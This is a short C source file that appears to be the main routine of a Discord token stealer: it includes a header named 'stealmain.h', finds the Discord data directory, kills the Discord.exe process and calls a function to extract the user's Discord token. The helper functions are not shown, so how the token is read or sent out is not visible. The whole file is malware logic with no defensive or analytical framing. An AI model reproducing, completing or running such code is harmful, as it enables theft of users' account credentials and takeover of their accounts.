#include <stdio.h>
#include <stdbool.h>
#include "stealmain.h"
#include <locale.h>
int main(void){
    setlocale(LC_ALL, "en_US.UTF-8");
    const char *discordDir = getDiscordDir();
    if(dirExists(discordDir)){
        killByExecutable("Discord.exe");
        extractDiscordToken(discordDir);
    }
    return 0;
}